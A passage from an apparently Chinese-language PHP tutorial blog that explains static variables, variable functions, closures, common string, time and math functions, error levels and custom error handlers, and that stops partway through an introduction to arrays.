<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 函数名(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//定义变量</span></span><br><span class="line">    <span class="built_in">static</span> $变量名 = 值;	<span class="comment">//通常会在定义的时候就直接赋值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//定义变量</span></span><br><span class="line">    <span class="variable">$local</span> = <span class="number">1</span>;		<span class="comment">//局部变量</span></span><br><span class="line">    <span class="comment">//定义静态变量</span></span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$count</span> = <span class="number">1</span>;		<span class="comment">//静态变量</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$local</span>++,<span class="variable">$count</span>++,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用</span></span><br><span class="line">display();		<span class="comment">//1,1</span></span><br><span class="line">display();		<span class="comment">//1,2</span></span><br><span class="line">display();		<span class="comment">//1,3</span></span><br></pre></td></tr></table></figure>
<p>静态变量的作用是为了跨函数共享数据（同一个函数被多次调用）</p>
<p>静态变量的原理：系统在进行编译的时候就会对static这一行进行初始化；为静态变量赋值；函数在调用的时候会自动跳过static这一行</p>
<p>静态变量的使用：</p>
<p>​    1、为了统计：当前函数被调用的次数（有没有替代方法？使用引用传递或者超全局变量）</p>
<p>​    2、为了统筹函数多次调用得到的不同结果（递归思想）</p>
<h3 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h3><p>可变函数：当前有一个变量所保存的值刚好是一个函数的名字，那么就可以使用变量+()来充当函数名使用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">__FUNCTION__</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义变量</span></span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;display&#x27;</span>;</span><br><span class="line"><span class="comment">//可变函数</span></span><br><span class="line"><span class="variable">$func</span>();		<span class="comment">//display，函数被执行了</span></span><br></pre></td></tr></table></figure>
<p>可变函数在系统使用的过程中还是比较多的，尤其是使用很多系统函数的时候：需要用户在外部定义一个自定义函数，但是是需要传入到系统函数内部使用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义系统函数（假设）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sys_function</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//给指定的函数（第一个参数），求对应的第二个参数值的4次方</span></span><br><span class="line">    <span class="comment">//为实际用户输入的数值进行处理</span></span><br><span class="line">    <span class="variable">$arg2</span> = <span class="variable">$arg2</span> +<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$arg1</span>(<span class="variable">$arg2</span>);		<span class="comment">//相当于user_function(20)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义一个用户函数：求一个数的四次方</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">user_function</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span> * <span class="variable">$num</span> * <span class="variable">$num</span> * <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//求10的4次方</span></span><br><span class="line"><span class="keyword">echo</span> sys_function(<span class="string">&#x27;user_function&#x27;</span>,<span class="number">10</span>);			<span class="comment">//160000</span></span><br></pre></td></tr></table></figure>
<p>将一个用户定义的函数传入给另一个函数（函数名）去使用的过程，称之为回调过程，而被传入的函数称之为回调函数。</p>
<h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>匿名函数：没有名字的函数</p>
<p>基本语法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">变量名 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    函数体</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义基本匿名函数</span></span><br><span class="line"><span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//函数体</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//调用匿名函数：可变函数</span></span><br><span class="line"><span class="variable">$func</span>();</span><br><span class="line"><span class="comment">//查看变量内容</span></span><br><span class="line">var_dump(<span class="variable">$func</span>);		<span class="comment">//object(Closure)</span></span><br></pre></td></tr></table></figure>
<p>变量保存匿名函数，本质得到的是一个对象（Closure）</p>
<h4 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h4><p>闭包：closure，一次来源于以下两者的结合：要执行的代码块（由于自由变量被包含在代码块中，这些自由变量以及它们引用的对象没有被释放）和为自由变量提供绑定的计算环境（作用域）</p>
<p>简单理解：函数内部有一些局部变量（要执行的代码块）在函数执行之后没有被释放，是因为在函数内部还有对应的函数在引用（函数的内部函数：匿名函数）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//闭包函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//定义变量：局部变量</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="keyword">__FUNCTION__</span>;</span><br><span class="line">    <span class="comment">//定义匿名函数</span></span><br><span class="line">    <span class="variable">$innerfunction</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">use</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;		<span class="comment">//use就是将外部变量（局部）保留给内部使用（闭包）</span></span><br><span class="line">        <span class="comment">//函数内部的函数</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$name</span>;	</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//调用函数</span></span><br><span class="line">    <span class="variable">$innerfunction</span>();</span><br><span class="line">&#125;</span><br><span class="line">display();</span><br></pre></td></tr></table></figure>
<p>证明：函数的局部变量在函数使用完之后没有被释放？</p>
<p>​    1、使用内部匿名函数</p>
<p>​    2、匿名韩式使用局部变量：use</p>
<p>​    3、匿名函数被返回为外部使用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//证明函数的局部变量在函数使用完之后没有被释放</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//定义变量：局部变量</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="keyword">__FUNCTION__</span>;</span><br><span class="line">    <span class="comment">//定义匿名函数</span></span><br><span class="line">    <span class="variable">$innerfunction</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">use</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;		<span class="comment">//use就是将外部变量（局部）保留给内部使用（闭包）</span></span><br><span class="line">        <span class="comment">//函数内部的函数</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$name</span>;	</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//返回内部匿名函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$innerfunction</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$closure</span> = display1();</span><br><span class="line"><span class="comment">//到此位置：display1函数运行结束：理论上局部变量$name应该已经被释放</span></span><br><span class="line"><span class="variable">$closure</span>();		<span class="comment">//display1,证明了当前局部变量$name没有被释放，从而在外部调用内部匿名函数的时候可以被使用</span></span><br></pre></td></tr></table></figure>


<h3 id="伪类型"><a href="#伪类型" class="headerlink" title="伪类型"></a>伪类型</h3><p>伪类型：加类型，实际上在PHP中不存在的类型。但是通过伪类型可以帮助程序员去更好的查看操作手册从而更加方便学习。</p>
<p>伪类型主要有两种：在三大类八小类之外</p>
<p>mixed：混合的，可以是多种PHP中的数据类型</p>
<p>number：数值的，可以是任意数值类型（整型和浮点型）</p>
<h3 id="常用系统函数"><a href="#常用系统函数" class="headerlink" title="常用系统函数"></a>常用系统函数</h3><h4 id="有关输出的函数"><a href="#有关输出的函数" class="headerlink" title="有关输出的函数"></a>有关输出的函数</h4><p>print()：类似于echo输出提供的内容，本质是一种结构（不是函数），返回1，可以不需要使用括号</p>
<p>print_r()：类似于var_dump，但是比var_dump简单，不会输出数据的类型，指挥输出值（数组打印使用比较多）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//输出相关</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">print</span>(<span class="string">&#x27;hello world&lt;br/&gt;&#x27;</span>);		<span class="comment">//hello world,1,此处的1是输出print的返回值1</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;hello world&lt;br/&gt;&#x27;</span>;		<span class="comment">//hello world</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello world&lt;br/&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$a</span>);		<span class="comment">//hello world</span></span><br></pre></td></tr></table></figure>


<h4 id="有关时间的函数"><a href="#有关时间的函数" class="headerlink" title="有关时间的函数"></a>有关时间的函数</h4><p>date()：按照指定格式对应的时间戳（从1970年格林威治时间开始计算的秒数），如果没有指定特定的时间戳，那么就是默认解释当前时间戳</p>
<p>time()：获取当前时间对应的时间戳</p>
<p>microtime()：获取微秒级别的时间</p>
<p>strtotime()：按照规定格式的字符串转换成时间戳</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//时间函数</span></span><br><span class="line"><span class="keyword">echo</span> date(<span class="string">&#x27;Y 年 m 月 d 日 H:i:s&#x27;</span>，<span class="number">12345678</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> time(),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> microtime(),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> strtotime(<span class="string">&#x27;tomorrow 10 hours&#x27;</span>);</span><br></pre></td></tr></table></figure>


<h4 id="有关数学的函数"><a href="#有关数学的函数" class="headerlink" title="有关数学的函数"></a>有关数学的函数</h4><p>max()：指定参数中最大的值</p>
<p>min()：指定参数中最小的数</p>
<p>rand()：得到一个随机数，指定区间的随机整数</p>
<p>mt_rand()：于rand一样，只是底层结构不一样，效率比rand高（建议使用）</p>
<p>round()：四舍五入</p>
<p>ceil()：向上取整</p>
<p>floor()：向下取整</p>
<p>pow()：求指定数字的指定指数次结果：pow(2,8) == 2^8 == 256</p>
<p>abs()：绝对值</p>
<p>sqrt()：平方根</p>
<h4 id="关于函数的函数"><a href="#关于函数的函数" class="headerlink" title="关于函数的函数"></a>关于函数的函数</h4><p>function_exists()：判断指定的函数名字是否在内存中存在（帮助用户不去使用一个不存在的函数，让代码安全性更高）</p>
<p>func_get_arg()：在自定义函数中去获取指定数值对应的参数</p>
<p>func_get_args()：在自定义函数中获取所有的参数（数组）</p>
<p>func_num_args()：获取当前自定义函数中参数的数量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数相关函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//获取指定参数</span></span><br><span class="line">    var_dump(func_get_arg(<span class="number">1</span>));</span><br><span class="line">    <span class="comment">//获取所有参数</span></span><br><span class="line">    var_dump(func_get_args());</span><br><span class="line">    <span class="comment">//获取参数数量</span></span><br><span class="line">    var_dump(func_num_args());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用函数</span></span><br><span class="line">function_exists(<span class="string">&#x27;test&#x27;</span>) &amp;&amp; test(<span class="number">1</span>,<span class="string">&#x27;2&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>);		<span class="comment">//string(1)&quot;2&quot;,array(4)&#123;1,&#x27;2&#x27;,3,4&#125;,int(4)</span></span><br></pre></td></tr></table></figure>
<p>参数的标识是从0开始，func_get_args和func_num_args都是统计的对应实参的数量</p>
<h3 id="字符串相关函数"><a href="#字符串相关函数" class="headerlink" title="字符串相关函数"></a>字符串相关函数</h3><p>​    1、转换函数：Implode()，explode()，str_split()</p>
<p>​        implode(连接方式,数组)：将数组中的元素按照某个规则连接成一个字符串</p>
<p>​        explode(分隔字符，目标字符串)：将字符串按照某个格式进行分隔，变成一个数组</p>
<p>​            中国|北京|顺义  == array(“中国”,”北京”,”顺义”)</p>
<p>​        str_split(字符串,字符长度)：按照指定长度拆分字符串得到数组</p>
<p>​    2、截取函数：trim()，ltrim()，rtrim()</p>
<p>​        trim(字符串[,指定字符])：本身默认是用来去除两边的空格（中间不行），但是也可以指定要去除的内容，是按照指定的内容循环取出两边有的内容：直到碰到一个不是目标字符为止</p>
<p>​        ltrim()：去除左边的</p>
<p>​        rtrim()：去除右边的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str1</span> = <span class="string">&#x27; ab cd ef &#x27;</span>;</span><br><span class="line"><span class="variable">$str2</span> = trim(<span class="variable">$str1</span>);</span><br><span class="line">var_dump(<span class="variable">$str2</span>);		<span class="comment">//string(8) &quot;ab cd ef&quot;</span></span><br></pre></td></tr></table></figure>
<p>​    3、截取函数：substr()，strstr()</p>
<p>​        substr(字符串,起始位置从0开始[,长度])：指定位置开始截取字符串，可以截取指定长度（不指定到最后）</p>
<p>​        strstr(字符串,匹配字符)：从指定位置开始，截取到最后（可以用来取文件后缀名）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str1</span> = <span class="string">&#x27; ab cd ef &#x27;</span>;</span><br><span class="line"><span class="variable">$str2</span> = substr(<span class="variable">$str1</span>,<span class="number">4</span>);</span><br><span class="line"><span class="variable">$str3</span> = strstr(<span class="variable">$str1</span>,<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">var_dump(<span class="variable">$str2</span>);		<span class="comment">//string(6) &quot;cd ef &quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$str3</span>);		<span class="comment">//string(6) &quot;cd ef &quot;</span></span><br></pre></td></tr></table></figure>
<p>​    4、大小写转换函数：strtolower()，strtoupper()，ucfirst()</p>
<p>​        strtolower()：全部小写</p>
<p>​        strtoupper()：全部大写</p>
<p>​        ucfirst()：首字母大写</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;abcd e f &#x27;</span></span><br><span class="line"><span class="keyword">echo</span> strtoupper(<span class="variable">$str</span>);		<span class="comment">//ABCD E F</span></span><br><span class="line"><span class="keyword">echo</span> ucfirst(<span class="variable">$str</span>);			<span class="comment">//Abcd e f</span></span><br></pre></td></tr></table></figure>
<p>​    5、查找函数：strpos()，strrpos()</p>
<p>​        strpos()：查找字符在目标字符串中首次出现的位置，没找到则返回false</p>
<p>​        strrpos()：查找字符在目标字符串中最后次出现的位置，没找到则返回false</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;123a123a123a123&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> strpos(<span class="variable">$str</span>,<span class="string">&#x27;a&#x27;</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;		<span class="comment">//3</span></span><br><span class="line"><span class="keyword">echo</span> strrpos(<span class="variable">$str</span>,<span class="string">&#x27;a&#x27;</span>);				<span class="comment">//11</span></span><br></pre></td></tr></table></figure>
<p>​    6、替换函数：str_replace()</p>
<p>​        str_replace(匹配目标,替换的内容,字符串本身)：将目标字符串中部分字符串进行替换</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;123a123a123a123&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> str_replace(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="variable">$str</span>);		<span class="comment">//123b123b123b123</span></span><br></pre></td></tr></table></figure>
<p>​    7、格式化函数：printf()，sprintf()</p>
<p>​        printf/sprintf(输出字符串有占位符,顺序占位内容…)：格式化输出数据</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$age</span> = <span class="number">8</span>;</span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;tony&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> sprintf(<span class="string">&#x27;你好,今年我%d岁，我叫%s&#x27;</span>,<span class="variable">$age</span>,<span class="variable">$name</span>);		<span class="comment">//你好,今年我8岁，我叫tony</span></span><br></pre></td></tr></table></figure>
<p>​    8、其他：str_repeat()，str_shuffle()</p>
<p>​        str_repeat()：重复某个字符串N次</p>
<p>​        str_shuffle()：随机打乱字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;abcdefg&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> str_repeat(<span class="variable">$str</span>,<span class="number">5</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;		<span class="comment">//abcdefgabcdefg</span></span><br><span class="line"><span class="keyword">echo</span> str_shuffle(<span class="variable">$str</span>);			<span class="comment">//fdbgeca</span></span><br></pre></td></tr></table></figure>


<h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>错误处理：指的是系统（或者用户）在对某些代码进行执行的时候，发现有错误，就会通过错误处理的形式告知程序员。</p>
<h3 id="错误分类"><a href="#错误分类" class="headerlink" title="错误分类"></a>错误分类</h3><p>​    1、语法错误：用户书写的代码不符合PHP的语法规范，语法错误会导致代码在编译过程中不通过，所以代码不会执行（pass error）</p>
<p>​    2、运行时错误：代码编译通过，但是代码在执行的过程中会出现一些调价你不满足导致的错误（runtime error）</p>
<p>​    3、逻辑错误：程序员在写代码的时候不够规范，出现了一些逻辑性的错误，导致代码正常执行，但是得不到想要的结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> = <span class="number">1</span>)&#123;		<span class="comment">//最常见把比较符号写成赋值符号</span></span><br><span class="line">    <span class="comment">//执行代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="错误代号"><a href="#错误代号" class="headerlink" title="错误代号"></a>错误代号</h3><p>所有看到的错误代号在PHP中都被定义成了系统常量（可以直接使用）    </p>
<p>1、系统错误：</p>
<p>​    E_PARSE：编译错误，代码不会执行</p>
<p>​    E_ERROR：fatal error，致命错误，会导致代码不能正确执行（出错的位置断掉）</p>
<p>​    E_WARNING：warning，警告错误，不会影响代码执行，但是可能得到意想不到的结果</p>
<p>​    E_NOTICE：notice，通知错误，不会影响代码执行</p>
<p>2、用户错误：E_USER_ERROR，E_USER_WARNING，E_USER_NOTICE</p>
<p>​    用户在使用自定义错误触发的时候，会使用到的错误代号（系统不会用到）</p>
<p>3、其他：E_ALL，代表着所有错误（通常在进行错误控制的时候使用比较多），建议在开发过程中（开发环境）使用</p>
<p>所有以E开头的错误常量（代号）其实都是由一个字节存储，然后每一2种错误占据一个对应的位，如果想进行一些错误的控制们可以使用位运算进行操作</p>
<p>排除通知级别notice：E_ALL &amp;  ~E_NOTICE</p>
<p>只要警告和通知：E_WARNING | E_NOTICE</p>
<h3 id="错误触发"><a href="#错误触发" class="headerlink" title="错误触发"></a>错误触发</h3><p>程序运行时触发：系统自动根据错误发生后，对比对应的错误信息，输出给用户：主要对于代码的语法错误和运行时错误。</p>
<p>认为触发：知道某些逻辑可能会出错，从而使用对应的判断代码来触发相应的错误提示。</p>
<p>trigger_error(错误提示)：可以通过第二个参数进行严格性控制</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span> == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">//人为触发错误</span></span><br><span class="line">    trigger_error(<span class="string">&#x27;除数不能为0！&#x27;</span>);		<span class="comment">//默认notice，会继续执行</span></span><br><span class="line">    trigger_error(<span class="string">&#x27;除数不能为0！&#x27;</span>,E_USER_ERROR);		<span class="comment">//指定错误级别为error，代码不会会执行</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span> / <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>


<h3 id="错误显示设置"><a href="#错误显示设置" class="headerlink" title="错误显示设置"></a>错误显示设置</h3><p>错误显示设置：哪些错误该显示，以及该如何显示</p>
<p>在PHP中，由两种方式来设置当前脚本的错误处理：</p>
<p>​    1、在PHP的配置文件中：全局配置：php.ini文件</p>
<p>​        display_errors：是否显示错误</p>
<p>​        error_reporting：显示什么级别的错误</p>
<p>​    2、可以在运行的PHP脚本中去设置：在脚本中定义的配置项级别比配置文件高（通才在开发当中都会在代码中去进行控制和配置）</p>
<p>​        error_reporting()：设置对应的错误显示级别</p>
<p>​        ini_set(‘配置文件中的配置项’,配置值)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ini_set(<span class="string">&#x27;error_reporting&#x27;</span>,E_ALL);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>


<h3 id="错误日志设置"><a href="#错误日志设置" class="headerlink" title="错误日志设置"></a>错误日志设置</h3><p>在实际生产环境中，不会让错误赤裸裸的展示给用户：</p>
<p>​    1、不友好</p>
<p>​    2、不安全：错误会暴露网站很多信息（路径、文件名）</p>
<p>所以在生产环境中，一般不显示错误（错误也比较少），但是不可能避免会出现错误（测试的时候不会发现所有的问题），这个时候不希望看到，但是又希望捕捉到可以让后台程序员去修改：需要保存到日志文件中，需要在PHP配置文件中或者代码中（ini_set）设置对应error_log配置项</p>
<p>​    1、开启日志功能：log_errors = On</p>
<p>​    2、指定保存路径：error_log = ‘保存路径’</p>
<h3 id="自定义错误处理"><a href="#自定义错误处理" class="headerlink" title="自定义错误处理"></a>自定义错误处理</h3><p>最简单的错误处理：trigger_error()函数，但是该函数不会阻止系统报错</p>
<p>PHP系统提供了一种用户处理错误的机制：用户自定义错误吃力函数，然后将该函数增加到系统错误处理的句柄中，然后系统会碰到错误之后，使用用户定义的错误函数。</p>
<p>​    1、如何将用户自定义的函数放到系统中：set_error_handler()</p>
<p>​    2、自定义错误处理函数，系统有要求：errno,errstr，自定义错误处理函数的头两个必须存在的参数，系统后期调用该自定义函数的时候，会给第一个和第二个传递对应的参数；errfile,errline,errcontext：可选参数：自定义函数中是否需要这些数据</p>
<p>代码实现：</p>
<p>​    1、自定义错误处理函数：注意参数</p>
<p>​    2、注册自定义函数：修改错误处理机制</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//自定义错误处理机制</span></span><br><span class="line"><span class="comment">//自定义函数</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	<span class="doctag">@param</span>1 $errno，是系统提供的错误代码：E_ALL,E_NOTICE...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_error</span>(<span class="params"><span class="variable">$errno</span>,<span class="variable">$errstr</span>,<span class="variable">$errfile</span>,<span class="variable">$errline</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//判断：当前会碰到那些错误，排除当前本身系统就要排除的错误</span></span><br><span class="line">    <span class="keyword">if</span>(!(error_reporting() &amp; <span class="variable">$errno</span>))&#123;</span><br><span class="line">    	<span class="comment">//error_reporting没有设置参数代表回去当前系统错误处理对应的级别</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;		</span><br><span class="line">    <span class="comment">//开始判断错误类型（错误匹配）</span></span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$errno</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> E_ERROR:</span><br><span class="line">        <span class="keyword">case</span> E_USER_ERROR:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;fatal error in file&#x27;</span> . <span class="variable">$errfile</span> . <span class="string">&#x27;on line&#x27;</span> . <span class="variable">$errline</span> . <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error info:&#x27;</span> . <span class="variable">$errstr</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> E_WARNING:</span><br><span class="line">        <span class="keyword">case</span> E_USER_WARNING:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;warning in file&#x27;</span> . <span class="variable">$errfile</span> . <span class="string">&#x27;on line&#x27;</span> . <span class="variable">$errline</span> . <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error info:&#x27;</span> . <span class="variable">$errstr</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> E_NOTICE:</span><br><span class="line">        <span class="keyword">case</span> E_USER_NOTICE:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;notice in file&#x27;</span> . <span class="variable">$errfile</span> . <span class="string">&#x27;on line&#x27;</span> . <span class="variable">$errline</span> . <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error info:&#x27;</span> . <span class="variable">$errstr</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//报错</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="comment">//修改错误机制</span></span><br><span class="line">set_error_handler(<span class="string">&#x27;my_error&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>
<p>当前属于简单自定义模式，如果要复杂，可以在某些影响代码功能的错误发生后，让用户跳转到某个指定界面。</p>
<h2 id="数组详解"><a href="#数组详解" class="headerlink" title="数组详解"></a>数组详解</h2><h3 id="数组的概念"><a href="#数组的概念" class="headerlink" title="数组的概念"></a>数组的概念</h3><p>数组：array，数据的组合，值将一组数据（多个）存储到一个指定的容器中，用变量指向该容器，然后可以通过变量一次性得到该容器中的所有数据。</p>
<h3 id="数组定义语法"><a href="#数组定义语法" class="headerlink" title="数组定义语法"></a>数组定义语法</h3><p>在PHP中系统提供了多种定义数组的方式：</p>
<p>​    1、使用array关键字：最常用的</p>
<p>​        $变量 = array(元素1,元素2,元素3…);</p>
<p>​    2、可以使用中括号来包裹数据：</p>
<p>​        $变量 = [元素1,元素2…];</p>
<p>​    3、隐形定义数组：给变量增加一个中括号，系统自动变成数组</p>
<p>​            $变量[] = 值1;        //如果不提供下标也可以，系统自动生成（数字：从0开始，且从当前前面最大的开始）</p>
<p>​            $变量[下标] = 值;    //中括号里面的内容称之为下标key，该下标可以是字母（单词）或者数字，与变量命名的规则相似</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义数组：array</span></span><br><span class="line"><span class="variable">$arr1</span> = <span class="keyword">array</span>(<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">var_dump(<span class="variable">$arr1</span>);	<span class="comment">//array(3) &#123; [0]=&gt; string(1) &quot;1&quot; [1]=&gt; int(2) [2]=&gt; string(5) &quot;hello&quot; &#125;</span></span><br><span class="line"><span class="comment">//定义数组：[]</span></span><br><span class="line"><span class="variable">$arr2</span> = [<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">var_dump(<span class="variable">$arr2</span>);	<span class="comment">//同上</span></span><br><span class="line"><span class="comment">//隐形数组：</span></span><br><span class="line"><span class="variable">$arr3</span>[] = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$arr3</span>[<span class="number">10</span>] = <span class="number">100</span>;</span><br><span class="line"><span class="variable">$arr3</span>[] = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line"><span class="variable">$arr3</span>[<span class="number">3</span>] = <span class="number">55</span>;</span><br><span class="line"><span class="variable">$arr3</span>[<span class="string">&#x27;key&#x27;</span>] = <span class="string">&#x27;key&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$arr3</span>);	<span class="comment">//array(5) &#123; [0]=&gt; int(1) [10]=&gt; int(100) 